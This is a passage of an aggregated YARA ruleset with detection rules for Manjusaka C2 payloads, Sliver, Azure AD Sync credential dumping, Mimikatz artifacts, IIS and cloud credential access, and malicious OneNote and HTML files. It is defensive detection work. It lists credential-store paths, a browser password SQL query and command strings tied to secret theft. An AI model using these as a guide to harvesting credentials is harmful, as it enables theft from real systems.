		$h09 = { 47 6F 20 62 75 69 6C 64 20 49 44 3A 20 22 65 72 52 47 4F 4A 56 48 65 38 37 58 67 6D 79 4F 56 77 48 44 2F 42 70 78 56 76 70 79 44 58 74 4C 64 64 79 57 46 64 38 4E 39 2F 6F 59 77 64 70 73 6D 46 45 44 58 39 32 58 4A 55 52 4C 55 7A 2F 62 62 58 59 38 43 76 6B 44 4D 72 69 42 33 32 64 49 36 53 58 }
		$h10 = { 47 6F 00 00 47 6E 42 4B 6F 63 4C 77 76 57 5A 6E 43 5F 55 6D 49 72 2D 72 2F 36 50 2D 4F 7A 46 62 51 37 39 6F 59 79 79 61 44 52 48 56 34 2F 38 74 6D 46 77 78 63 53 64 63 63 6D 70 66 73 5A 63 33 68 62 2F 77 34 2D 36 49 52 50 70 75 42 66 75 61 68 7A 50 63 4C 35 32 00 }
		$h11 = { 47 6F 06 FF FF FF FF 6E 42 4B 6F 63 4C 77 76 57 5A 6E 43 5F 55 6D 49 72 2D 72 2F 36 50 2D 4F 7A 46 62 51 37 39 6F FF FF 6F FF 59 79 79 61 44 52 48 56 DC 38 74 6D 46 77 78 63 53 64 63 63 6D 70 66 73 5A 63 33 68 62 }
		$h12 = { 47 6F 00 00 4E 50 57 41 64 50 62 57 6D 6E 58 72 30 61 36 67 44 37 4B 7A 2F 54 74 6E 59 64 4F 79 43 6A 76 63 43 51 75 5A 39 47 69 44 72 2F 46 43 6D 4F 69 38 41 30 36 36 52 50 43 36 53 4F 57 76 61 4D 2F 43 70 57 37 4F 30 73 38 61 51 32 42 46 56 64 66 65 62 54 4A 00 }
		$h13 = { 47 6F 06 FF FF FF 7F 4E 50 57 41 64 50 62 57 6D 6E 58 72 30 61 36 67 44 37 4B 7A 2F 54 74 6E 59 64 4F 79 43 6A 76 FF FF FF FF 63 43 51 75 5A 39 47 69 44 72 2F 46 43 6D 4F 69 38 41 30 36 36 52 50 43 36 53 4F 57 76 61 4D 2F }

	condition:
		any of them
}

rule AVASTTI_Manjusaka_Payload_Encoded_Hexstring
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "9799081c-67ec-5ab8-9b23-31f60c05fc05"
		date = "2022-10-05"
		modified = "2022-10-05"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/Manjusaka/Manjusaka.yar#L64-L93"
		license_url = "N/A"
		logic_hash = "5c0b83e709baea7db6185d888bfa10bab073eb0eb2f3fb72df2da76fff3f6f22"
		score = 75
		quality = 90
		tags = ""

	strings:
		$s01 = "1f8b08000000000000ff7cdd099c1ae5fd3ff031e620c6038d5aea493df18a24c688372626c1180d468d78d465b34b96357be0ee2612354ab5553caa68ad454d158f2a566b51ab454d2dde"
		$s02 = "1f8b08000000000000ff94dd09982355d9fffd62d89a45880a181621804240c10888718328a8ed864144a3029d66ba67d2cc4c4fecee8180a85114f3284b4096b00d619380085111f3284a"
		$s03 = "1f8b08000000000000ff94dd0b982355b5fffde21eee011503a204440d201001317a148278890a1804348ad269667a260d3d33b1bb19820246bc10914bb80811618c80108f084110232204"
		$s04 = "1f8b08000000000000ff94dd07981bd5d9fffdb131208a41b4075123ba280101c6112d88d04468a22b01b25abc6b6bf17aadecae4140008540103582001110401483e8a28b2e4a4074d197"
		$s11 = "1f8b08000000000000ffecbd09784cd7ff077c26c924631977828958c284694d5092da12eb8448ce302108a248628ba82d65862025e924b8aeabdaeaa2abb6bfaebad74f83fe4804a1d5d6"
		$s12 = "1f8b08000000000000ffecbd097414c5faff5d9d7502849e400209201974c4441113371240c8842cd5d00361070502224bdc403203a82c8993d1146d2b7ac5e5ba5cdcb9aea85c36176612"
		$s13 = "1f8b08000000000000ffecbd7b7854d5d928be7632496620710d4874522e9991ad4e94627641491425031378b7ae1150046a1168a1237ca2419801542e893b53b3d8eeafb4b5777b8eb5fd"
		$s14 = "1f8b08000000000000ffecbd7b7854d5d530be4f32496620710f9ae8a45c3223479d28d51c414934960c4c601ddd23a811a845a0858e50d120cc002a97c49369b3399e96b6dacb5bfb7dbe"
		$s15 = "1f8b08000000000000ffecbd79785445d6305eb7934e3a90e676846887451abc68c7b5e33293284b37e924a7e506a222a022c45119501c23744b1c194ce6764b2a97abcc88233a3aaee38a"

	condition:
		(AVASTTI_EXE_PRIVATE or AVASTTI_ELF_PRIVATE ) and ( any of ( $s0* ) and any of ( $s1* ) )
}

rule AVASTTI_Manjusaka_Payload_Elf
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "010398f6-ca9b-58b4-a9d8-12428f649ffc"
		date = "2022-10-05"
		modified = "2022-10-05"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/Manjusaka/Manjusaka.yar#L95-L122"
		license_url = "N/A"
		hash = "0063e5007566e0a7e8bfd73c4628c6d140b332df4f9afbb0adcf0c832dd54c2b"
		hash = "76eb9af0e2f620016d63d38ddb86f0f3f8f598b54146ad14e6af3d8f347dd365"
		hash = "0a5174b5181fcd6827d9c4a83e9f0423838cbb5a6b23d012c3ae414b31c8b0da"
		hash = "63e7f6fa89faa88b346d0cceddf2ef2e3ebf5d5828aa0087663c227422041db7"
		hash = "400855b63b8452221869630c58b7ab03373dabf77c0f10df635e746c13f98ea9"
		hash = "4eb337c12f0e0ee73b3209bed4b819719c4af9f63f3e81dbc3bbf06212450f1c"
		logic_hash = "bbc496788381b57b3ea2814dd61a824d552233f9c5f73287f8bc284252fbedfe"
		score = 75
		quality = 90
		tags = ""

	strings:
		$s01 = "proc/meminfo/proc/uptime/etc/os-releaseVERSION_ID=NAME=DISTRIB_ID"
		$s02 = "/root/.cargo/registry/src/mirrors.ustc.edu.cn"
		$s03 = "cmdlineexecwdassertion failed"
		$s04 = "/etc/passwd/root/"
		$s11 = "./protos/cs.rstargetpidAgentsagentAgentUpdatesleepenckeysysinfoConfigPluginExecPluginLoadReqCwd"
		$s12 = "ReqScreenH"
		$s13 = "manjusakahttp:"
		$s14 = "pluginexecpluginloadreqcwdreqcmd"
		$s15 = "/NPSC2/npc/libs/"

	condition:
		AVASTTI_ELF_PRIVATE and ( all of ( $s0* ) and any of ( $s1* ) )
}

rule AVASTTI_Manjusaka_Payload_Mz
{
	meta:
		description = "No description has been set in the source file - AvastTI"
		author = "Avast Threat Intel Team"
		id = "808fe840-27e2-5361-b97a-4b04e6d8f7da"
		date = "2022-10-05"
		modified = "2022-10-05"
		reference = "https://github.com/avast/ioc"
		source_url = "https://github.com/avast/ioc/blob/5659f4f0f4e09970c5de29c536ceb500d5634951/Manjusaka/Manjusaka.yar#L124-L161"
		license_url = "N/A"
		hash = "6839180bc3a2404e629c108d7e8c8548caf9f8249bbbf658b47c00a15a64758f"
		hash = "cd0c75638724c0529cc9e7ca0a91d2f5d7221ef2a87b65ded2bc1603736e3b5d"
		hash = "d5918611b1837308d0c6d19bff4b81b00d4f6a30c1240c00a9e0a9b08dde1412"
		hash = "2b174d417a4e43fd6759c64512faa88f4504e8f14f08fd5348fff51058c9958f"
		hash = "377bacba69d2bec770599ab21a202b574b92fb431fc35bbdf39080025d6cf2d6"
		hash = "86c633467ba7981d3946a63184dbfabce587b571f761b3eb1e3e43f6b1df6f2c"
		hash = "51857882d1202e72c0cf18ff21de773c2a31ee68ff28385f968478401c5ab4bb"
		hash = "e07aa10f19574a856a4ac389a3ded96f2d78f41f939935dd678811bd12b5bd03"
		hash = "9e7144540430d97de38a2adcef16ad43e23c91281462b135fcc56cafc2f34160"
		logic_hash = "81b01eff8384707ce67f6d888e59e690d7fb7b4e32359043ced9230499813aa7"
		score = 60
		quality = 50
		tags = ""

	strings:
		$s01 = ".\\protos\\cs.rstargetintranethostnameplatformpidAgentsstatusagentinternetupdateatAgentUpdate"
		$s02 = "PluginExecPluginLoadReqCwdcmdReqCmd"
		$s03 = "Users\\Administrator.WIN7-2021OVWRCZ\\.cargo"
		$s04 = "Users\\runneradmin\\.cargo"
		$s05 = "windows\\c.rsNtReadFile"
		$s11 = "src\\mirrors.ustc.edu.cn-"
		$s12 = "CodeProject\\hw_src\\NPSC2\\npc\\target\\release\\deps\\npc.pdb"
		$s13 = "@@@manjusaka"
		$s14 = "***manjusakahttp://"
		$s15 = "SELECT signon_realm, username_value, password_value FROM loginsnetshwlanshowprofile"
		$s16 = "name=key=clearWIFI"
		$s17 = "cmd.exe/c"
		$s18 = "Accept-Languagezh-CN,zh;q=0.9,en;q=0.8Accept-Encodinggzip"
		$s19 = "library\\std\\src\\sys_common\\wtf8.rs"
		$s110 = "plug_getpass_nps.dll"
		$s111 = "plug_test_nps.dll"

	condition:
		AVASTTI_EXE_PRIVATE and ( 2 of ( $s0* ) or 3 of ( $s1* ) )
}

rule SBOUSSEADEN_Gosliver
{
	meta:
		description = "No description has been set in the source file - SBousseaden"
		author = "SBousseaden"
		id = "eba5043a-ca4d-5c5d-a895-51218b03e59e"
		date = "2020-10-11"
		modified = "2020-10-11"
		reference = "https://github.com/BishopFox/sliver"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_sliver_go_framwwork.yara#L2-L9"
		license_url = "N/A"
		logic_hash = "8dc96e533adc29c78a998d9f064ff294d2ef8a4ff00cef8b0c81ef465ef70b08"
		score = 75
		quality = 75
		tags = ""

	strings:
		$go = "_cgo_"

	condition:
		#go> 10 and pe.exports ( "RunSliver" )
}

rule SBOUSSEADEN_Adsync_Creddump_Wide
{
	meta:
		description = "AD Connect Sync Credential Extract"
		author = "SBousseaden"
		id = "ccbfa79a-924b-512a-a9e9-005567b4fe83"
		date = "2020-04-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L45-L67"
		license_url = "N/A"
		logic_hash = "e8b0ff1fa9117a98799239d37c5a0ae8be25c2c2519c4fc2a1d7f085a9ebe2e1"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = "private_configuration_xml" wide xor
		$s2 = "LoadKeySet" xor
		$s3 = "encrypted_configuration" wide xor
		$s4 = "GetActiveCredentialKey" xor
		$s5 = "DecryptBase64ToString" xor
		$s6 = "KeyManager" xor
		$s7 = "(LocalDB)\\.\\ADSync" wide xor
		$s8 = "mms_management_agent" wide xor
		$s9 = "keyset_id" wide xor
		$s10 = "xp_cmdshell" xor
		$s11 = "System.Data.SqlClient"
		$s12 = "Password" wide xor
		$fp1 = "mmsutils\\mmsutils.pdb"

	condition:
		5 of them and not $fp1
}

rule SBOUSSEADEN_Adsync_Creddump_Xor
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "e0d951ec-ec39-5f37-b5a8-ddd0b1dc588d"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L69-L89"
		license_url = "N/A"
		logic_hash = "831ed0410000ad9dfa7be2ab1f64a4130810465cf699bb3e45c93075db6fdb74"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" xor
		$a2 = "LoadKeySet" xor
		$a3 = "encrypted_configuration" xor
		$a4 = "GetActiveCredentialKey" xor
		$a5 = "DecryptBase64ToString" xor
		$a6 = "Cryptography.KeyManager" xor
		$b1 = "mms_management_agent" xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" xor
		$b3 = "xp_cmdshell" xor
		$b4 = "Password" xor
		$b5 = "forest-login-user" xor
		$b6 = "forest-login-domain" xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_V64
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "9f536ff2-95b6-5f93-8c6f-e3738d6404c7"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L91-L111"
		license_url = "N/A"
		logic_hash = "e2465fec6dd9384d5d7f31f1c0e7661f4fbd5e3f87a14abfcb9b0412985cb1d6"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" base64
		$a2 = "LoadKeySet" base64
		$a3 = "encrypted_configuration" base64
		$a4 = "GetActiveCredentialKey" base64
		$a5 = "DecryptBase64ToString" base64
		$a6 = "Cryptography.KeyManager" base64
		$b1 = "mms_management_agent" base64
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" base64
		$b3 = "xp_cmdshell" base64
		$b4 = "Password" base64
		$b5 = "forest-login-user" base64
		$b6 = "forest-login-domain" base64

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Adsync_Creddump_Xwide
{
	meta:
		description = "Azure AdSync Service Account Password Dumping"
		author = "SBousseaden"
		id = "a8c3e60a-99b8-50c8-992c-fbe18499a615"
		date = "2020-03-08"
		modified = "2020-12-28"
		reference = "https://blog.xpnsec.com/azuread-connect-for-redteam/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L112-L132"
		license_url = "N/A"
		logic_hash = "9015005494cb3cc52645a9c82f6179992942243a816b05273bc26f58ac70a2e0"
		score = 75
		quality = 75
		tags = ""

	strings:
		$a1 = "private_configuration_xml" wide xor
		$a2 = "LoadKeySet" wide xor
		$a3 = "encrypted_configuration" wide xor
		$a4 = "GetActiveCredentialKey" wide xor
		$a5 = "DecryptBase64ToString" wide xor
		$a6 = "Cryptography.KeyManager" wide xor
		$b1 = "mms_management_agent" wide xor
		$b2 = "Microsoft Azure AD Sync\\Bin\\mcrypt.dl" wide xor
		$b3 = "xp_cmdshell" wide xor
		$b4 = "Password" wide xor
		$b5 = "forest-login-user" wide xor
		$b6 = "forest-login-domain" wide xor

	condition:
		4 of ( $a* ) or 4 of ( $b* )
}

rule SBOUSSEADEN_Hunt_Credaccess_Cloud
{
	meta:
		description = "hunt for the presence of more than 1 known cloud client utility related credential paths"
		author = "SBousseaden"
		id = "a1916a13-ba08-57b4-8615-5ff08986e128"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L134-L150"
		license_url = "N/A"
		logic_hash = "09814a4bb118b5015936943c8585475fd88e0b49d08587fedeeb2c0b4d7ab979"
		score = 50
		quality = 75
		tags = ""

	strings:
		$aws = "\\.aws\\credentials" xor
		$gcloud1 = "\\gcloud\\credentials.db" xor
		$gcloud2 = "\\gcloud\\legacy_credentials" xor
		$gcloud3 = "\\gcloud\\access_tokens.db" xor
		$azure1 = "\\.azure\\accessTokens.json" xor
		$azure2 = "\\.azure\\azureProfile.json" xor
		$git = "\\.config\\git\\credentials" xor
		$slack1 = "\\Slack\\Cookies" xor
		$slack2 = "\\Slack\\StaleCookies-8" xor

	condition:
		4 of them
}

rule SBOUSSEADEN_Hunt_Credaccess_Cloud_Wide_Xor
{
	meta:
		description = "hunt for the presence of more than 1 known cloud client utility related credential paths"
		author = "SBousseaden"
		id = "8e48151c-8a9b-57b1-8464-5be28afc347b"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L152-L168"
		license_url = "N/A"
		logic_hash = "0625fc019eeeac8c219fa997c5957b69e5073c82d5cb1b880a5c1f7295ba2b7a"
		score = 50
		quality = 75
		tags = ""

	strings:
		$aws = "\\.aws\\credentials" wide xor
		$gcloud1 = "\\gcloud\\credentials.db" wide xor
		$gcloud2 = "\\gcloud\\legacy_credentials" wide xor
		$gcloud3 = "\\gcloud\\access_tokens.db" wide xor
		$azure1 = "\\.azure\\accessTokens.json" wide xor
		$azure2 = "\\.azure\\azureProfile.json" wide xor
		$git = "\\.config\\git\\credentials" wide xor
		$slack1 = "\\Slack\\Cookies" wide xor
		$slack2 = "\\Slack\\StaleCookies-8" wide xor

	condition:
		4 of them
}

rule SBOUSSEADEN_Hunt_Credaccess_Cloud_Base64
{
	meta:
		description = "hunt for the presence of more than 1 known cloud client utility related credential paths"
		author = "SBousseaden"
		id = "34460cb1-acf4-53e7-9c95-f69824a87836"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L170-L186"
		license_url = "N/A"
		logic_hash = "bf0acdc6e72e3528a93709b99f40aa13b45d9a3d22d8373d54414cc9be49d4d0"
		score = 50
		quality = 75
		tags = ""

	strings:
		$aws = "\\.aws\\credentials" base64
		$gcloud1 = "\\gcloud\\credentials.db" base64
		$gcloud2 = "\\gcloud\\legacy_credentials" base64
		$gcloud3 = "\\gcloud\\access_tokens.db" base64
		$azure1 = "\\.azure\\accessTokens.json" base64
		$azure2 = "\\.azure\\azureProfile.json" base64
		$git = "\\.config\\git\\credentials" base64
		$slack1 = "\\Slack\\Cookies" base64
		$slack2 = "\\Slack\\StaleCookies-8" base64

	condition:
		4 of them
}

rule SBOUSSEADEN_Hunt_Credaccess_Cloud_Wide_Base64
{
	meta:
		description = "hunt for the presence of more than 1 known cloud client utility related credential paths"
		author = "SBousseaden"
		id = "5c9a77b6-612b-5d5d-926c-833e49f8020e"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L188-L204"
		license_url = "N/A"
		logic_hash = "1dd7aba89ddef2d18807bef77abd106a74f2e339e1e3bbd102c2edee14ffcf6f"
		score = 50
		quality = 75
		tags = ""

	strings:
		$aws = "\\.aws\\credentials" wide base64
		$gcloud1 = "\\gcloud\\credentials.db" wide base64
		$gcloud2 = "\\gcloud\\legacy_credentials" wide base64
		$gcloud3 = "\\gcloud\\access_tokens.db" wide base64
		$azure1 = "\\.azure\\accessTokens.json" wide base64
		$azure2 = "\\.azure\\azureProfile.json" wide base64
		$git = "\\.config\\git\\credentials" wide base64
		$slack1 = "\\Slack\\Cookies" wide base64
		$slack2 = "\\Slack\\StaleCookies-8" wide base64

	condition:
		4 of them
}

rule SBOUSSEADEN_Hunt_Credaccess_Iis
{
	meta:
		description = "hunt for strings related to iis credential access"
		author = "SBousseaden"
		id = "0edfb8a5-83ab-5d6f-b8c9-7d3e03a6e32a"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L206-L219"
		license_url = "N/A"
		logic_hash = "b193e40e932d3168c826baaa070b2484e7e4781a481ab911a9526f9bc23d24a1"
		score = 50
		quality = 73
		tags = ""

	strings:
		$a1 = "aspnet_regiis.exe" nocase
		$a2 = "connectionStrings" nocase
		$a3 = "web.config" nocase
		$a4 = "-pdf" nocase
		$b1 = "appcmd.exe" nocase
		$b2 = "/text:password"

	condition:
		( all of ( $a* ) or all of ( $b* ) )
}

rule SBOUSSEADEN_Hunt_Credaccess_Iis_Xor
{
	meta:
		description = "hunt for strings related to iis credential access"
		author = "SBousseaden"
		id = "ed5dd469-cf08-5eb1-bfde-36460c10197b"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L221-L234"
		license_url = "N/A"
		logic_hash = "58c316238cacfbfd5a539d6dbae9bc31836c414d5179ca5c40aa2cfae6c69655"
		score = 60
		quality = 45
		tags = ""

	strings:
		$a1 = "aspnet_regiis.exe" wide xor
		$a2 = "connectionStrings" wide xor
		$a3 = "web.config" wide xor
		$a4 = "-pdf" wide xor
		$b1 = "appcmd.exe" wide xor
		$b2 = "/text:password" wide xor

	condition:
		( all of ( $a* ) or all of ( $b* ) )
}

rule SBOUSSEADEN_Hunt_Credaccess_Iis_Base64
{
	meta:
		description = "hunt for strings related to iis credential access"
		author = "SBousseaden"
		id = "3a6b41b1-5a6a-536e-ac99-fb45ec460767"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L236-L249"
		license_url = "N/A"
		logic_hash = "b09c4cfaefeae28cb9381ae7b94ef970f10a6a265a3e40766d2a8c109b2df054"
		score = 50
		quality = 75
		tags = ""

	strings:
		$a1 = "aspnet_regiis.exe" base64
		$a2 = "connectionStrings" base64
		$a3 = "web.config" base64
		$a4 = "-pdf" base64
		$b1 = "appcmd.exe" base64
		$b2 = "/text:password" base64

	condition:
		(3 of ( $a* ) or all of ( $b* ) )
}

rule SBOUSSEADEN_Hunt_Credaccess_Iis_Wide_Base64
{
	meta:
		description = "hunt for strings related to iis credential access"
		author = "SBousseaden"
		id = "9e709338-2b61-53b6-99b4-36b52991bc27"
		date = "2020-07-20"
		modified = "2020-12-28"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_capab_credentials_access.yara#L251-L264"
		license_url = "N/A"
		logic_hash = "6b06ef3a19fc4ce4d6a3f23815ac411094574cf15bfcc18d675017c7e357d1cf"
		score = 50
		quality = 75
		tags = ""

	strings:
		$a1 = "aspnet_regiis.exe" wide base64
		$a2 = "connectionStrings" wide base64
		$a3 = "web.config" wide base64
		$a4 = "-pdf" wide base64
		$b1 = "appcmd.exe" wide base64
		$b2 = "/text:password" wide base64

	condition:
		(3 of ( $a* ) or all of ( $b* ) )
}

rule SBOUSSEADEN_Mimikatz_Kiwikey
{
	meta:
		description = "hunt for default mimikatz kiwikey"
		author = "SBousseaden"
		id = "3141e679-6e07-5017-9675-4557fb876ebc"
		date = "2020-08-08"
		modified = "2020-08-09"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/kiwikey.yara#L1-L10"
		license_url = "N/A"
		logic_hash = "03745aed838dafad2fc6e190f181141bda31c212af56edb8ba665b86671f8bee"
		score = 75
		quality = 75
		tags = ""

	strings:
		$A = {60 BA 4F CA C7 44 24 ?? DC 46 6C 7A C7 44 24 ?? 03 3C 17 81 C7 44 24 ?? 94 C0 3D F6}
		$B = {48 B8 ?? ?? ?? ?? ?? ?? ?? ?? FF D0}

	condition:
		$A and #B > 10
}

rule SBOUSSEADEN_Hunt_Evtmutehook_Memory
{
	meta:
		description = "memory hunt for default wevtsv EtwEventCallback hook pattern to apply to eventlog svchost memory dump"
		author = "SBousseaden"
		id = "5326581e-90d9-59b9-8dc5-74df97571600"
		date = "2020-09-05"
		modified = "2020-09-05"
		reference = "https://blog.dylan.codes/pwning-windows-event-logging/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/hunt_memory_evtmutehook.yara#L1-L11"
		license_url = "N/A"
		logic_hash = "3db66069ed67d90031a6fe071dad4d0200ddd661b263dd2860df026673031e48"
		score = 50
		quality = 75
		tags = ""

	strings:
		$a = {49 BB ?? ?? ?? ?? ?? ?? ?? ?? 41 FF E3 54 24 20 4C 8B 05 61 CB 1A 00 0F 57 C0 66 0F 7F 44 24 20 E8 5B 0A 00 00 48 83 C4 38 C3}
		$b = {48 83 EC 38 4C 8B 0D 65 CB 1A 00 48 8D 54 24 20 4C 8B 05 61 CB 1A 00 0F 57 C0 66 0F 7F 44 24 20 E8 5B 0A 00 00 48 83 C4 38 C3}

	condition:
		$a and not $b
}

rule SBOUSSEADEN_Mimikatz_Memssp_Hookfn
{
	meta:
		description = "hunt for default mimikatz memssp module both ondisk and in memory artifacts"
		author = "SBousseaden"
		id = "845827b1-acd4-53af-97fb-43a4fe355fbf"
		date = "2020-08-26"
		modified = "2020-08-26"
		reference = "https://github.com/sbousseaden/YaraHunts/"
		source_url = "https://github.com/sbousseaden/YaraHunts//blob/71b27a2a7c57c2aa1877a11d8933167794e2b4fb/mimikatz_memssp_hookfn.yara#L1-L22"
		license_url = "N/A"
		logic_hash = "f63f3de05dd4f4f40cda6df67b75e37d7baa82c4b4cafd3ebdca35adfb0b15f8"
		score = 75
		quality = 75
		tags = ""

	strings:
		$s1 = {44 30 00 38 00}
		$s2 = {48 78 00 3A 00}
		$s3 = {4C 25 00 30 00}
		$s4 = {50 38 00 78 00}
		$s5 = {54 5D 00 20 00}
		$s6 = {58 25 00 77 00}
		$s7 = {5C 5A 00 5C 00}
		$s8 = {60 25 00 77 00}
		$s9 = {64 5A 00 09 00}
		$s10 = {6C 5A 00 0A 00}
		$s11 = {68 25 00 77 00}
		$s12 = {68 25 00 77 00}
		$s13 = {6C 5A 00 0A 00}
		$B = {6D 69 6D 69 C7 84 24 8C 00 00 00 6C 73 61 2E C7 84 24 90 00 00 00 6C 6F 67}

	condition:
		all of ( $s* ) or $B
}

rule ELCEEF_HTML_Windows_Search_Abuse
{
	meta:
		description = "Detects HTML files abusing Windows system functionalities to redirect and download malicious payloads"
		author = "marcin@ulikowski.pl"
		id = "537cb46e-4cfc-517c-8d6d-0019f2c3e5ef"
		date = "2024-06-15"
		modified = "2024-06-16"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/HTML_Windows_Search.yara#L1-L22"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "6a0d490cf08ab0aad3c535645abe9ebc26d12768cf2a2e932cdb7ec93cf3e2bd"
		score = 75
		quality = 73
		tags = ""
		hash1 = "d136dcfc355885c502ff2c3be229791538541b748b6c07df3ced95f9a7eb2f30"

	strings:
		$location1 = "location.href" wide ascii
		$location2 = "location.replace(" wide ascii
		$location3 = "location.assign(" wide ascii
		$metarefresh = "<meta http-equiv=\"refresh\"" nocase wide ascii
		$search1 = "\"search-ms:query=" wide ascii
		$search2 = "\"search:query=" wide ascii
		$search3 = "URL=search:query=" wide ascii
		$crumb1 = "&crumb=location:" wide ascii
		$crumb2 = "&amp;crumb=location:" wide ascii

	condition:
		( any of ( $location* ) or $metarefresh ) and any of ( $search* ) and any of ( $crumb* )
}

rule ELCEEF_Suspicious_Onenote
{
	meta:
		description = "Detects OneNote documents with FileDataStoreObject structure containing: PE32, shortcut files (*.lnk), encoded JS, Windows Help File (*.chm), or batch script"
		author = "marcin@ulikowski.pl"
		id = "57f6fc7f-666f-5887-ac97-513588415757"
		date = "2023-01-22"
		modified = "2023-02-21"
		reference = "https://github.com/elceef/yara-rulz"
		source_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/rules/Suspicious_OneNote.yara#L1-L23"
		license_url = "https://github.com/elceef/yara-rulz/blob/05834717d1464d5efce8ad9d688ff7b53886a0bb/LICENSE"
		logic_hash = "b65f0976b71c1e827ecce09f0c435d9ffa6a5d3b3a41401efc6a14b6259af4ad"
		score = 65
		quality = 75
		tags = ""
		hash1 = "f408ef3fa89546483ba63f58be3f27a98795655eb4b9b6217cbe302a5ba9d5f7"
		hash2 = "5306fa7940b4d67dfb031fd315b661cecb2ce81e2f34c9393e1826df0f0bbdc5"
		hash3 = "e1d34ad42938a777d80f3ee4c206de14021f13ab79600168b85894fdb0867b3e"
		hash4 = "9e89231578d8b9b190de3288fd10f43cf11a24963a8b0a76f0c46170deda59fd"
		hash5 = "6778c59a29e25d722230163bea272ece58d2d3696fbce4347c20104e8fb735dc"

	strings:
		$magic = { ae b1 53 78 d0 29 96 d3 }
		$fdso_pe32 = { a4 c4 8d 4d 0b 7a 9e ac [20] 4d 5a }
		$fdso_bat = { a4 c4 8d 4d 0b 7a 9e ac [20] 40 65 63 68 6f 20 6f 66 66 }
		$fdso_lnk = { a4 c4 8d 4d 0b 7a 9e ac [20] 4c 00 00 00 01 14 02 00 }
		$fdso_jse = { a4 c4 8d 4d 0b 7a 9e ac [20] 23 40 7e 5e }
		$fdso_chm = { a4 c4 8d 4d 0b 7a 9e ac [20] 49 54 53 46 03 }

	condition:
		$magic at 8 and 1 of ( $fdso_* )
}

rule ELCEEF_EICAR_Encrypted_ZIP
{
	meta:
		description = "Detects EICAR file in any encrypted ZIP archive"
		author = "marcin@ulikowski.pl"
		id = "c12d42de-356a-584b-9c48-71e65940f1cf"
		date = "2022-12-13"
		modified = "2022-12-16"
		reference = "https://github.com/elceef/yara-rulz"
